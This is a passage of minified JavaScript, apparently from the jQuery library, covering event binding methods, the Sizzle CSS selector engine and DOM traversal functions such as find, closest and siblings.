                }, one: function (e, t, n, r) {
                    return this.on(e, t, n, r, 1)
                }, off: function (e, t, n) {
                    var r, i;
                    if (e && e.preventDefault && e.handleObj) return r = e.handleObj, N(e.delegateTarget).off(r.namespace ? r.origType + "." + r.namespace : r.origType, r.selector, r.handler), this;
                    if ("object" == typeof e) {
                        for (i in e) this.off(i, t, e[i]);
                        return this
                    }
                    return (!1 === t || "function" == typeof t) && (n = t, t = a), !1 === n && (n = ce), this.each((function () {
                        N.event.remove(this, e, n, t)
                    }))
                }, bind: function (e, t, n) {
                    return this.on(e, null, t, n)
                }, unbind: function (e, t) {
                    return this.off(e, null, t)
                }, delegate: function (e, t, n, r) {
                    return this.on(t, e, n, r)
                }, undelegate: function (e, t, n) {
                    return 1 === arguments.length ? this.off(e, "**") : this.off(t, e || "**", n)
                }, trigger: function (e, t) {
                    return this.each((function () {
                        N.event.trigger(e, t, this)
                    }))
                }, triggerHandler: function (e, t) {
                    var n = this[0];
                    return n ? N.event.trigger(e, t, n, !0) : a
                }
            }), function (e, t) {
                var n, r, i, o, a, s, u, l, c, f, p, d, h, m, g, y, v, b = "sizzle" + -new Date, x = e.document, w = {},
                    T = 0, C = 0, k = re(), E = re(), S = re(), A = typeof t, j = 1 << 31, D = [], L = D.pop,
                    H = D.push, M = D.slice, _ = D.indexOf || function (e) {
                        for (var t = 0, n = this.length; n > t; t++) if (this[t] === e) return t;
                        return -1
                    }, q = "[\\x20\\t\\r\\n\\f]", O = "(?:\\\\.|[\\w-]|[^\\x00-\\xa0])+", F = O.replace("w", "w#"),
                    B = "([*^$|!~]?=)",
                    R = "\\[" + q + "*(" + O + ")" + q + "*(?:" + B + q + "*(?:(['\"])((?:\\\\.|[^\\\\])*?)\\3|(" + F + ")|)|)" + q + "*\\]",
                    P = ":(" + O + ")(?:\\(((['\"])((?:\\\\.|[^\\\\])*?)\\3|((?:\\\\.|[^\\\\()[\\]]|" + R.replace(3, 8) + ")*)|.*)\\)|)",
                    W = RegExp("^" + q + "+|((?:^|[^\\\\])(?:\\\\.)*)" + q + "+$", "g"),
                    $ = RegExp("^" + q + "*," + q + "*"), I = RegExp("^" + q + "*([\\x20\\t\\r\\n\\f>+~])" + q + "*"),
                    z = RegExp(P), X = RegExp("^" + F + "$"), V = {
                        ID: RegExp("^#(" + O + ")"),
                        CLASS: RegExp("^\\.(" + O + ")"),
                        NAME: RegExp("^\\[name=['\"]?(" + O + ")['\"]?\\]"),
                        TAG: RegExp("^(" + O.replace("w", "w*") + ")"),
                        ATTR: RegExp("^" + R),
                        PSEUDO: RegExp("^" + P),
                        CHILD: RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\(" + q + "*(even|odd|(([+-]|)(\\d*)n|)" + q + "*(?:([+-]|)" + q + "*(\\d+)|))" + q + "*\\)|)", "i"),
                        needsContext: RegExp("^" + q + "*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\(" + q + "*((?:-\\d)?\\d*)" + q + "*\\)|)(?=[^-]|$)", "i")
                    }, U = /[\x20\t\r\n\f]*[+~]/, Y = /^[^{]+\{\s*\[native code/, G = /^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,
                    J = /^(?:input|select|textarea|button)$/i, Q = /^h\d$/i, Z = /'|\\/g,
                    K = /\=[\x20\t\r\n\f]*([^'"\]]*)[\x20\t\r\n\f]*\]/g, ee = /\\([\da-fA-F]{1,6}[\x20\t\r\n\f]?|.)/g,
                    te = function (e, t) {
                        var n = "0x" + t - 65536;
                        return n !== n ? t : 0 > n ? String.fromCharCode(n + 65536) : String.fromCharCode(55296 | n >> 10, 56320 | 1023 & n)
                    };
                try {
                    M.call(x.documentElement.childNodes, 0)[0].nodeType
                } catch (se) {
                    M = function (e) {
                        var t, n = [];
                        while (t = this[e++]) n.push(t);
                        return n
                    }
                }

                function ne(e) {
                    return Y.test(e + "")
                }

                function re() {
                    var e, t = [];
                    return e = function (n, r) {
                        return t.push(n += " ") > i.cacheLength && delete e[t.shift()], e[n] = r
                    }
                }

                function ie(e) {
                    return e[b] = !0, e
                }

                function oe(e) {
                    var t = f.createElement("div");
                    try {
                        return e(t)
                    } catch (n) {
                        return !1
                    } finally {
                        t = null
                    }
                }

                function ae(e, t, n, r) {
                    var i, o, a, s, u, l, p, m, g, v;
                    if ((t ? t.ownerDocument || t : x) !== f && c(t), t = t || f, n = n || [], !e || "string" != typeof e) return n;
                    if (1 !== (s = t.nodeType) && 9 !== s) return [];
                    if (!d && !r) {
                        if (i = G.exec(e)) if (a = i[1]) {
                            if (9 === s) {
                                if (o = t.getElementById(a), !o || !o.parentNode) return n;
                                if (o.id === a) return n.push(o), n
                            } else if (t.ownerDocument && (o = t.ownerDocument.getElementById(a)) && y(t, o) && o.id === a) return n.push(o), n
                        } else {
                            if (i[2]) return H.apply(n, M.call(t.getElementsByTagName(e), 0)), n;
                            if ((a = i[3]) && w.getByClassName && t.getElementsByClassName) return H.apply(n, M.call(t.getElementsByClassName(a), 0)), n
                        }
                        if (w.qsa && !h.test(e)) {
                            if (p = !0, m = b, g = t, v = 9 === s && e, 1 === s && "object" !== t.nodeName.toLowerCase()) {
                                l = pe(e), (p = t.getAttribute("id")) ? m = p.replace(Z, "\\$&") : t.setAttribute("id", m), m = "[id='" + m + "'] ", u = l.length;
                                while (u--) l[u] = m + de(l[u]);
                                g = U.test(e) && t.parentNode || t, v = l.join(",")
                            }
                            if (v) try {
                                return H.apply(n, M.call(g.querySelectorAll(v), 0)), n
                            } catch (N) {
                            } finally {
                                p || t.removeAttribute("id")
                            }
                        }
                    }
                    return we(e.replace(W, "$1"), t, n, r)
                }

                function ue(e, t) {
                    var n = t && e, r = n && (~t.sourceIndex || j) - (~e.sourceIndex || j);
                    if (r) return r;
                    if (n) while (n = n.nextSibling) if (n === t) return -1;
                    return e ? 1 : -1
                }

                function le(e) {
                    return function (t) {
                        var n = t.nodeName.toLowerCase();
                        return "input" === n && t.type === e
                    }
                }

                function ce(e) {
                    return function (t) {
                        var n = t.nodeName.toLowerCase();
                        return ("input" === n || "button" === n) && t.type === e
                    }
                }

                function fe(e) {
                    return ie((function (t) {
                        return t = +t, ie((function (n, r) {
                            var i, o = e([], n.length, t), a = o.length;
                            while (a--) n[i = o[a]] && (n[i] = !(r[i] = n[i]))
                        }))
                    }))
                }

                for (n in a = ae.isXML = function (e) {
                    var t = e && (e.ownerDocument || e).documentElement;
                    return !!t && "HTML" !== t.nodeName
                }, c = ae.setDocument = function (e) {
                    var n = e ? e.ownerDocument || e : x;
                    return n !== f && 9 === n.nodeType && n.documentElement ? (f = n, p = n.documentElement, d = a(n), w.tagNameNoComments = oe((function (e) {
                        return e.appendChild(n.createComment("")), !e.getElementsByTagName("*").length
                    })), w.attributes = oe((function (e) {
                        e.innerHTML = "<select></select>";
                        var t = typeof e.lastChild.getAttribute("multiple");
                        return "boolean" !== t && "string" !== t
                    })), w.getByClassName = oe((function (e) {
                        return e.innerHTML = "<div class='hidden e'></div><div class='hidden'></div>", !(!e.getElementsByClassName || !e.getElementsByClassName("e").length) && (e.lastChild.className = "e", 2 === e.getElementsByClassName("e").length)
                    })), w.getByName = oe((function (e) {
                        e.id = b + 0, e.innerHTML = "<a name='" + b + "'></a><div name='" + b + "'></div>", p.insertBefore(e, p.firstChild);
                        var t = n.getElementsByName && n.getElementsByName(b).length === 2 + n.getElementsByName(b + 0).length;
                        return w.getIdNotName = !n.getElementById(b), p.removeChild(e), t
                    })), i.attrHandle = oe((function (e) {
                        return e.innerHTML = "<a href='#'></a>", e.firstChild && typeof e.firstChild.getAttribute !== A && "#" === e.firstChild.getAttribute("href")
                    })) ? {} : {
                        href: function (e) {
                            return e.getAttribute("href", 2)
                        }, type: function (e) {
                            return e.getAttribute("type")
                        }
                    }, w.getIdNotName ? (i.find.ID = function (e, t) {
                        if (typeof t.getElementById !== A && !d) {
                            var n = t.getElementById(e);
                            return n && n.parentNode ? [n] : []
                        }
                    }, i.filter.ID = function (e) {
                        var t = e.replace(ee, te);
                        return function (e) {
                            return e.getAttribute("id") === t
                        }
                    }) : (i.find.ID = function (e, n) {
                        if (typeof n.getElementById !== A && !d) {
                            var r = n.getElementById(e);
                            return r ? r.id === e || typeof r.getAttributeNode !== A && r.getAttributeNode("id").value === e ? [r] : t : []
                        }
                    }, i.filter.ID = function (e) {
                        var t = e.replace(ee, te);
                        return function (e) {
                            var n = typeof e.getAttributeNode !== A && e.getAttributeNode("id");
                            return n && n.value === t
                        }
                    }), i.find.TAG = w.tagNameNoComments ? function (e, n) {
                        return typeof n.getElementsByTagName !== A ? n.getElementsByTagName(e) : t
                    } : function (e, t) {
                        var n, r = [], i = 0, o = t.getElementsByTagName(e);
                        if ("*" === e) {
                            while (n = o[i++]) 1 === n.nodeType && r.push(n);
                            return r
                        }
                        return o
                    }, i.find.NAME = w.getByName && function (e, n) {
                        return typeof n.getElementsByName !== A ? n.getElementsByName(name) : t
                    }, i.find.CLASS = w.getByClassName && function (e, n) {
                        return typeof n.getElementsByClassName === A || d ? t : n.getElementsByClassName(e)
                    }, m = [], h = [":focus"], (w.qsa = ne(n.querySelectorAll)) && (oe((function (e) {
                        e.innerHTML = "<select><option selected=''></option></select>", e.querySelectorAll("[selected]").length || h.push("\\[" + q + "*(?:checked|disabled|ismap|multiple|readonly|selected|value)"), e.querySelectorAll(":checked").length || h.push(":checked")
                    })), oe((function (e) {
                        e.innerHTML = "<input type='hidden' i=''/>", e.querySelectorAll("[i^='']").length && h.push("[*^$]=" + q + "*(?:\"\"|'')"), e.querySelectorAll(":enabled").length || h.push(":enabled", ":disabled"), e.querySelectorAll("*,:x"), h.push(",.*:")
                    }))), (w.matchesSelector = ne(g = p.matchesSelector || p.mozMatchesSelector || p.webkitMatchesSelector || p.oMatchesSelector || p.msMatchesSelector)) && oe((function (e) {
                        w.disconnectedMatch = g.call(e, "div"), g.call(e, "[s!='']:x"), m.push("!=", P)
                    })), h = RegExp(h.join("|")), m = RegExp(m.join("|")), y = ne(p.contains) || p.compareDocumentPosition ? function (e, t) {
                        var n = 9 === e.nodeType ? e.documentElement : e, r = t && t.parentNode;
                        return e === r || !(!r || 1 !== r.nodeType || !(n.contains ? n.contains(r) : e.compareDocumentPosition && 16 & e.compareDocumentPosition(r)))
                    } : function (e, t) {
                        if (t) while (t = t.parentNode) if (t === e) return !0;
                        return !1
                    }, v = p.compareDocumentPosition ? function (e, t) {
                        var r;
                        return e === t ? (u = !0, 0) : (r = t.compareDocumentPosition && e.compareDocumentPosition && e.compareDocumentPosition(t)) ? 1 & r || e.parentNode && 11 === e.parentNode.nodeType ? e === n || y(x, e) ? -1 : t === n || y(x, t) ? 1 : 0 : 4 & r ? -1 : 1 : e.compareDocumentPosition ? -1 : 1
                    } : function (e, t) {
                        var r, i = 0, o = e.parentNode, a = t.parentNode, s = [e], l = [t];
                        if (e === t) return u = !0, 0;
                        if (!o || !a) return e === n ? -1 : t === n ? 1 : o ? -1 : a ? 1 : 0;
                        if (o === a) return ue(e, t);
                        r = e;
                        while (r = r.parentNode) s.unshift(r);
                        r = t;
                        while (r = r.parentNode) l.unshift(r);
                        while (s[i] === l[i]) i++;
                        return i ? ue(s[i], l[i]) : s[i] === x ? -1 : l[i] === x ? 1 : 0
                    }, u = !1, [0, 0].sort(v), w.detectDuplicates = u, f) : f
                }, ae.matches = function (e, t) {
                    return ae(e, null, null, t)
                }, ae.matchesSelector = function (e, t) {
                    if ((e.ownerDocument || e) !== f && c(e), t = t.replace(K, "='$1']"), !(!w.matchesSelector || d || m && m.test(t) || h.test(t))) try {
                        var n = g.call(e, t);
                        if (n || w.disconnectedMatch || e.document && 11 !== e.document.nodeType) return n
                    } catch (r) {
                    }
                    return ae(t, f, null, [e]).length > 0
                }, ae.contains = function (e, t) {
                    return (e.ownerDocument || e) !== f && c(e), y(e, t)
                }, ae.attr = function (e, t) {
                    var n;
                    return (e.ownerDocument || e) !== f && c(e), d || (t = t.toLowerCase()), (n = i.attrHandle[t]) ? n(e) : d || w.attributes ? e.getAttribute(t) : ((n = e.getAttributeNode(t)) || e.getAttribute(t)) && !0 === e[t] ? t : n && n.specified ? n.value : null
                }, ae.error = function (e) {
                    throw Error("Syntax error, unrecognized expression: " + e)
                }, ae.uniqueSort = function (e) {
                    var t, n = [], r = 1, i = 0;
                    if (u = !w.detectDuplicates, e.sort(v), u) {
                        for (; t = e[r]; r++) t === e[r - 1] && (i = n.push(r));
                        while (i--) e.splice(n[i], 1)
                    }
                    return e
                }, o = ae.getText = function (e) {
                    var t, n = "", r = 0, i = e.nodeType;
                    if (i) {
                        if (1 === i || 9 === i || 11 === i) {
                            if ("string" == typeof e.textContent) return e.textContent;
                            for (e = e.firstChild; e; e = e.nextSibling) n += o(e)
                        } else if (3 === i || 4 === i) return e.nodeValue
                    } else for (; t = e[r]; r++) n += o(t);
                    return n
                }, i = ae.selectors = {
                    cacheLength: 50,
                    createPseudo: ie,
                    match: V,
                    find: {},
                    relative: {
                        ">": {dir: "parentNode", first: !0},
                        " ": {dir: "parentNode"},
                        "+": {dir: "previousSibling", first: !0},
                        "~": {dir: "previousSibling"}
                    },
                    preFilter: {
                        ATTR: function (e) {
                            return e[1] = e[1].replace(ee, te), e[3] = (e[4] || e[5] || "").replace(ee, te), "~=" === e[2] && (e[3] = " " + e[3] + " "), e.slice(0, 4)
                        }, CHILD: function (e) {
                            return e[1] = e[1].toLowerCase(), "nth" === e[1].slice(0, 3) ? (e[3] || ae.error(e[0]), e[4] = +(e[4] ? e[5] + (e[6] || 1) : 2 * ("even" === e[3] || "odd" === e[3])), e[5] = +(e[7] + e[8] || "odd" === e[3])) : e[3] && ae.error(e[0]), e
                        }, PSEUDO: function (e) {
                            var t, n = !e[5] && e[2];
                            return V.CHILD.test(e[0]) ? null : (e[4] ? e[2] = e[4] : n && z.test(n) && (t = pe(n, !0)) && (t = n.indexOf(")", n.length - t) - n.length) && (e[0] = e[0].slice(0, t), e[2] = n.slice(0, t)), e.slice(0, 3))
                        }
                    },
                    filter: {
                        TAG: function (e) {
                            return "*" === e ? function () {
                                return !0
                            } : (e = e.replace(ee, te).toLowerCase(), function (t) {
                                return t.nodeName && t.nodeName.toLowerCase() === e
                            })
                        }, CLASS: function (e) {
                            var t = k[e + " "];
                            return t || (t = RegExp("(^|" + q + ")" + e + "(" + q + "|$)")) && k(e, (function (e) {
                                return t.test(e.className || typeof e.getAttribute !== A && e.getAttribute("class") || "")
                            }))
                        }, ATTR: function (e, t, n) {
                            return function (r) {
                                var i = ae.attr(r, e);
                                return null == i ? "!=" === t : !t || (i += "", "=" === t ? i === n : "!=" === t ? i !== n : "^=" === t ? n && 0 === i.indexOf(n) : "*=" === t ? n && i.indexOf(n) > -1 : "$=" === t ? n && i.slice(-n.length) === n : "~=" === t ? (" " + i + " ").indexOf(n) > -1 : "|=" === t && (i === n || i.slice(0, n.length + 1) === n + "-"))
                            }
                        }, CHILD: function (e, t, n, r, i) {
                            var o = "nth" !== e.slice(0, 3), a = "last" !== e.slice(-4), s = "of-type" === t;
                            return 1 === r && 0 === i ? function (e) {
                                return !!e.parentNode
                            } : function (t, n, u) {
                                var l, c, f, p, d, h, m = o !== a ? "nextSibling" : "previousSibling", g = t.parentNode,
                                    y = s && t.nodeName.toLowerCase(), v = !u && !s;
                                if (g) {
                                    if (o) {
                                        while (m) {
                                            f = t;
                                            while (f = f[m]) if (s ? f.nodeName.toLowerCase() === y : 1 === f.nodeType) return !1;
                                            h = m = "only" === e && !h && "nextSibling"
                                        }
                                        return !0
                                    }
                                    if (h = [a ? g.firstChild : g.lastChild], a && v) {
                                        c = g[b] || (g[b] = {}), l = c[e] || [], d = l[0] === T && l[1], p = l[0] === T && l[2], f = d && g.childNodes[d];
                                        while (f = ++d && f && f[m] || (p = d = 0) || h.pop()) if (1 === f.nodeType && ++p && f === t) {
                                            c[e] = [T, d, p];
                                            break
                                        }
                                    } else if (v && (l = (t[b] || (t[b] = {}))[e]) && l[0] === T) p = l[1]; else while (f = ++d && f && f[m] || (p = d = 0) || h.pop()) if ((s ? f.nodeName.toLowerCase() === y : 1 === f.nodeType) && ++p && (v && ((f[b] || (f[b] = {}))[e] = [T, p]), f === t)) break;
                                    return p -= i, p === r || 0 === p % r && p / r >= 0
                                }
                            }
                        }, PSEUDO: function (e, t) {
                            var n,
                                r = i.pseudos[e] || i.setFilters[e.toLowerCase()] || ae.error("unsupported pseudo: " + e);
                            return r[b] ? r(t) : r.length > 1 ? (n = [e, e, "", t], i.setFilters.hasOwnProperty(e.toLowerCase()) ? ie((function (e, n) {
                                var i, o = r(e, t), a = o.length;
                                while (a--) i = _.call(e, o[a]), e[i] = !(n[i] = o[a])
                            })) : function (e) {
                                return r(e, 0, n)
                            }) : r
                        }
                    },
                    pseudos: {
                        not: ie((function (e) {
                            var t = [], n = [], r = s(e.replace(W, "$1"));
                            return r[b] ? ie((function (e, t, n, i) {
                                var o, a = r(e, null, i, []), s = e.length;
                                while (s--) (o = a[s]) && (e[s] = !(t[s] = o))
                            })) : function (e, i, o) {
                                return t[0] = e, r(t, null, o, n), !n.pop()
                            }
                        })), has: ie((function (e) {
                            return function (t) {
                                return ae(e, t).length > 0
                            }
                        })), contains: ie((function (e) {
                            return function (t) {
                                return (t.textContent || t.innerText || o(t)).indexOf(e) > -1
                            }
                        })), lang: ie((function (e) {
                            return X.test(e || "") || ae.error("unsupported lang: " + e), e = e.replace(ee, te).toLowerCase(), function (t) {
                                var n;
                                do {
                                    if (n = d ? t.getAttribute("xml:lang") || t.getAttribute("lang") : t.lang) return n = n.toLowerCase(), n === e || 0 === n.indexOf(e + "-")
                                } while ((t = t.parentNode) && 1 === t.nodeType);
                                return !1
                            }
                        })), target: function (t) {
                            var n = e.location && e.location.hash;
                            return n && n.slice(1) === t.id
                        }, root: function (e) {
                            return e === p
                        }, focus: function (e) {
                            return e === f.activeElement && (!f.hasFocus || f.hasFocus()) && !!(e.type || e.href || ~e.tabIndex)
                        }, enabled: function (e) {
                            return !1 === e.disabled
                        }, disabled: function (e) {
                            return !0 === e.disabled
                        }, checked: function (e) {
                            var t = e.nodeName.toLowerCase();
                            return "input" === t && !!e.checked || "option" === t && !!e.selected
                        }, selected: function (e) {
                            return e.parentNode && e.parentNode.selectedIndex, !0 === e.selected
                        }, empty: function (e) {
                            for (e = e.firstChild; e; e = e.nextSibling) if (e.nodeName > "@" || 3 === e.nodeType || 4 === e.nodeType) return !1;
                            return !0
                        }, parent: function (e) {
                            return !i.pseudos.empty(e)
                        }, header: function (e) {
                            return Q.test(e.nodeName)
                        }, input: function (e) {
                            return J.test(e.nodeName)
                        }, button: function (e) {
                            var t = e.nodeName.toLowerCase();
                            return "input" === t && "button" === e.type || "button" === t
                        }, text: function (e) {
                            var t;
                            return "input" === e.nodeName.toLowerCase() && "text" === e.type && (null == (t = e.getAttribute("type")) || t.toLowerCase() === e.type)
                        }, first: fe((function () {
                            return [0]
                        })), last: fe((function (e, t) {
                            return [t - 1]
                        })), eq: fe((function (e, t, n) {
                            return [0 > n ? n + t : n]
                        })), even: fe((function (e, t) {
                            for (var n = 0; t > n; n += 2) e.push(n);
                            return e
                        })), odd: fe((function (e, t) {
                            for (var n = 1; t > n; n += 2) e.push(n);
                            return e
                        })), lt: fe((function (e, t, n) {
                            for (var r = 0 > n ? n + t : n; --r >= 0;) e.push(r);
                            return e
                        })), gt: fe((function (e, t, n) {
                            for (var r = 0 > n ? n + t : n; t > ++r;) e.push(r);
                            return e
                        }))
                    }
                }, {radio: !0, checkbox: !0, file: !0, password: !0, image: !0}) i.pseudos[n] = le(n);
                for (n in {submit: !0, reset: !0}) i.pseudos[n] = ce(n);

                function pe(e, t) {
                    var n, r, o, a, s, u, l, c = E[e + " "];
                    if (c) return t ? 0 : c.slice(0);
                    s = e, u = [], l = i.preFilter;
                    while (s) {
                        for (a in (!n || (r = $.exec(s))) && (r && (s = s.slice(r[0].length) || s), u.push(o = [])), n = !1, (r = I.exec(s)) && (n = r.shift(), o.push({
                            value: n,
                            type: r[0].replace(W, " ")
                        }), s = s.slice(n.length)), i.filter) !(r = V[a].exec(s)) || l[a] && !(r = l[a](r)) || (n = r.shift(), o.push({
                            value: n,
                            type: a,
                            matches: r
                        }), s = s.slice(n.length));
                        if (!n) break
                    }
                    return t ? s.length : s ? ae.error(e) : E(e, u).slice(0)
                }

                function de(e) {
                    for (var t = 0, n = e.length, r = ""; n > t; t++) r += e[t].value;
                    return r
                }

                function he(e, t, n) {
                    var i = t.dir, o = n && "parentNode" === i, a = C++;
                    return t.first ? function (t, n, r) {
                        while (t = t[i]) if (1 === t.nodeType || o) return e(t, n, r)
                    } : function (t, n, s) {
                        var u, l, c, f = T + " " + a;
                        if (s) {
                            while (t = t[i]) if ((1 === t.nodeType || o) && e(t, n, s)) return !0
                        } else while (t = t[i]) if (1 === t.nodeType || o) if (c = t[b] || (t[b] = {}), (l = c[i]) && l[0] === f) {
                            if (!0 === (u = l[1]) || u === r) return !0 === u
                        } else if (l = c[i] = [f], l[1] = e(t, n, s) || r, !0 === l[1]) return !0
                    }
                }

                function me(e) {
                    return e.length > 1 ? function (t, n, r) {
                        var i = e.length;
                        while (i--) if (!e[i](t, n, r)) return !1;
                        return !0
                    } : e[0]
                }

                function ge(e, t, n, r, i) {
                    for (var o, a = [], s = 0, u = e.length, l = null != t; u > s; s++) (o = e[s]) && (!n || n(o, r, i)) && (a.push(o), l && t.push(s));
                    return a
                }

                function ye(e, t, n, r, i, o) {
                    return r && !r[b] && (r = ye(r)), i && !i[b] && (i = ye(i, o)), ie((function (o, a, s, u) {
                        var l, c, f, p = [], d = [], h = a.length, m = o || xe(t || "*", s.nodeType ? [s] : s, []),
                            g = !e || !o && t ? m : ge(m, p, e, s, u), y = n ? i || (o ? e : h || r) ? [] : a : g;
                        if (n && n(g, y, s, u), r) {
                            l = ge(y, d), r(l, [], s, u), c = l.length;
                            while (c--) (f = l[c]) && (y[d[c]] = !(g[d[c]] = f))
                        }
                        if (o) {
                            if (i || e) {
                                if (i) {
                                    l = [], c = y.length;
                                    while (c--) (f = y[c]) && l.push(g[c] = f);
                                    i(null, y = [], l, u)
                                }
                                c = y.length;
                                while (c--) (f = y[c]) && (l = i ? _.call(o, f) : p[c]) > -1 && (o[l] = !(a[l] = f))
                            }
                        } else y = ge(y === a ? y.splice(h, y.length) : y), i ? i(null, a, y, u) : H.apply(a, y)
                    }))
                }

                function ve(e) {
                    for (var t, n, r, o = e.length, a = i.relative[e[0].type], s = a || i.relative[" "], u = a ? 1 : 0, c = he((function (e) {
                        return e === t
                    }), s, !0), f = he((function (e) {
                        return _.call(t, e) > -1
                    }), s, !0), p = [function (e, n, r) {
                        return !a && (r || n !== l) || ((t = n).nodeType ? c(e, n, r) : f(e, n, r))
                    }]; o > u; u++) if (n = i.relative[e[u].type]) p = [he(me(p), n)]; else {
                        if (n = i.filter[e[u].type].apply(null, e[u].matches), n[b]) {
                            for (r = ++u; o > r; r++) if (i.relative[e[r].type]) break;
                            return ye(u > 1 && me(p), u > 1 && de(e.slice(0, u - 1)).replace(W, "$1"), n, r > u && ve(e.slice(u, r)), o > r && ve(e = e.slice(r)), o > r && de(e))
                        }
                        p.push(n)
                    }
                    return me(p)
                }

                function be(e, t) {
                    var n = 0, o = t.length > 0, a = e.length > 0, s = function (s, u, c, p, d) {
                        var h, m, g, y = [], v = 0, b = "0", x = s && [], w = null != d, C = l,
                            N = s || a && i.find.TAG("*", d && u.parentNode || u),
                            k = T += null == C ? 1 : Math.random() || .1;
                        for (w && (l = u !== f && u, r = n); null != (h = N[b]); b++) {
                            if (a && h) {
                                m = 0;
                                while (g = e[m++]) if (g(h, u, c)) {
                                    p.push(h);
                                    break
                                }
                                w && (T = k, r = ++n)
                            }
                            o && ((h = !g && h) && v--, s && x.push(h))
                        }
                        if (v += b, o && b !== v) {
                            m = 0;
                            while (g = t[m++]) g(x, y, u, c);
                            if (s) {
                                if (v > 0) while (b--) x[b] || y[b] || (y[b] = L.call(p));
                                y = ge(y)
                            }
                            H.apply(p, y), w && !s && y.length > 0 && v + t.length > 1 && ae.uniqueSort(p)
                        }
                        return w && (T = k, l = C), x
                    };
                    return o ? ie(s) : s
                }

                function xe(e, t, n) {
                    for (var r = 0, i = t.length; i > r; r++) ae(e, t[r], n);
                    return n
                }

                function we(e, t, n, r) {
                    var o, a, u, l, c, f = pe(e);
                    if (!r && 1 === f.length) {
                        if (a = f[0] = f[0].slice(0), a.length > 2 && "ID" === (u = a[0]).type && 9 === t.nodeType && !d && i.relative[a[1].type]) {
                            if (t = i.find.ID(u.matches[0].replace(ee, te), t)[0], !t) return n;
                            e = e.slice(a.shift().value.length)
                        }
                        o = V.needsContext.test(e) ? 0 : a.length;
                        while (o--) {
                            if (u = a[o], i.relative[l = u.type]) break;
                            if ((c = i.find[l]) && (r = c(u.matches[0].replace(ee, te), U.test(a[0].type) && t.parentNode || t))) {
                                if (a.splice(o, 1), e = r.length && de(a), !e) return H.apply(n, M.call(r, 0)), n;
                                break
                            }
                        }
                    }
                    return s(e, f)(r, t, d, n, U.test(e)), n
                }

                function Te() {
                }

                s = ae.compile = function (e, t) {
                    var n, r = [], i = [], o = S[e + " "];
                    if (!o) {
                        t || (t = pe(e)), n = t.length;
                        while (n--) o = ve(t[n]), o[b] ? r.push(o) : i.push(o);
                        o = S(e, be(i, r))
                    }
                    return o
                }, i.pseudos.nth = i.pseudos.eq, i.filters = Te.prototype = i.pseudos, i.setFilters = new Te, c(), ae.attr = N.attr, N.find = ae, N.expr = ae.selectors, N.expr[":"] = N.expr.pseudos, N.unique = ae.uniqueSort, N.text = ae.getText, N.isXMLDoc = ae.isXML, N.contains = ae.contains
            }(o);
            var fe = /Until$/, pe = /^(?:parents|prev(?:Until|All))/, de = /^.[^:#\[\.,]*$/,
                he = N.expr.match.needsContext, me = {children: !0, contents: !0, next: !0, prev: !0};

            function ge(e, t) {
                do {
                    e = e[t]
                } while (e && 1 !== e.nodeType);
                return e
            }

            function ye(e, t, n) {
                if (t = t || 0, N.isFunction(t)) return N.grep(e, (function (e, r) {
                    var i = !!t.call(e, r, e);
                    return i === n
                }));
                if (t.nodeType) return N.grep(e, (function (e) {
                    return e === t === n
                }));
                if ("string" == typeof t) {
                    var r = N.grep(e, (function (e) {
                        return 1 === e.nodeType
                    }));
                    if (de.test(t)) return N.filter(t, r, !n);
                    t = N.filter(t, r)
                }
                return N.grep(e, (function (e) {
                    return N.inArray(e, t) >= 0 === n
                }))
            }

            function ve(e) {
                var t = be.split("|"), n = e.createDocumentFragment();
                if (n.createElement) while (t.length) n.createElement(t.pop());
                return n
            }

            N.fn.extend({
                find: function (e) {
                    var t, n, r, i = this.length;
                    if ("string" != typeof e) return r = this, this.pushStack(N(e).filter((function () {
                        for (t = 0; i > t; t++) if (N.contains(r[t], this)) return !0
                    })));
                    for (n = [], t = 0; i > t; t++) N.find(e, this[t], n);
                    return n = this.pushStack(i > 1 ? N.unique(n) : n), n.selector = (this.selector ? this.selector + " " : "") + e, n
                }, has: function (e) {
                    var t, n = N(e, this), r = n.length;
                    return this.filter((function () {
                        for (t = 0; r > t; t++) if (N.contains(this, n[t])) return !0
                    }))
                }, not: function (e) {
                    return this.pushStack(ye(this, e, !1))
                }, filter: function (e) {
                    return this.pushStack(ye(this, e, !0))
                }, is: function (e) {
                    return !!e && ("string" == typeof e ? he.test(e) ? N(e, this.context).index(this[0]) >= 0 : N.filter(e, this).length > 0 : this.filter(e).length > 0)
                }, closest: function (e, t) {
                    for (var n, r = 0, i = this.length, o = [], a = he.test(e) || "string" != typeof e ? N(e, t || this.context) : 0; i > r; r++) {
                        n = this[r];
                        while (n && n.ownerDocument && n !== t && 11 !== n.nodeType) {
                            if (a ? a.index(n) > -1 : N.find.matchesSelector(n, e)) {
                                o.push(n);
                                break
                            }
                            n = n.parentNode
                        }
                    }
                    return this.pushStack(o.length > 1 ? N.unique(o) : o)
                }, index: function (e) {
                    return e ? "string" == typeof e ? N.inArray(this[0], N(e)) : N.inArray(e.jquery ? e[0] : e, this) : this[0] && this[0].parentNode ? this.first().prevAll().length : -1
                }, add: function (e, t) {
                    var n = "string" == typeof e ? N(e, t) : N.makeArray(e && e.nodeType ? [e] : e),
                        r = N.merge(this.get(), n);
                    return this.pushStack(N.unique(r))
                }, addBack: function (e) {
                    return this.add(null == e ? this.prevObject : this.prevObject.filter(e))
                }
            }), N.fn.andSelf = N.fn.addBack, N.each({
                parent: function (e) {
                    var t = e.parentNode;
                    return t && 11 !== t.nodeType ? t : null
                }, parents: function (e) {
                    return N.dir(e, "parentNode")
                }, parentsUntil: function (e, t, n) {
                    return N.dir(e, "parentNode", n)
                }, next: function (e) {
                    return ge(e, "nextSibling")
                }, prev: function (e) {
                    return ge(e, "previousSibling")
                }, nextAll: function (e) {
                    return N.dir(e, "nextSibling")
                }, prevAll: function (e) {
                    return N.dir(e, "previousSibling")
                }, nextUntil: function (e, t, n) {
                    return N.dir(e, "nextSibling", n)
                }, prevUntil: function (e, t, n) {
                    return N.dir(e, "previousSibling", n)
                }, siblings: function (e) {
                    return N.sibling((e.parentNode || {}).firstChild, e)
                }, children: function (e) {
                    return N.sibling(e.firstChild)
                }, contents: function (e) {
                    return N.nodeName(e, "iframe") ? e.contentDocument || e.contentWindow.document : N.merge([], e.childNodes)
                }
            }, (function (e, t) {
                N.fn[e] = function (n, r) {
                    var i = N.map(this, t, n);
                    return fe.test(e) || (r = n), r && "string" == typeof r && (i = N.filter(r, i)), i = this.length > 1 && !me[e] ? N.unique(i) : i, this.length > 1 && pe.test(e) && (i = i.reverse()), this.pushStack(i)
                }
            })), N.extend({
                filter: function (e, t, n) {
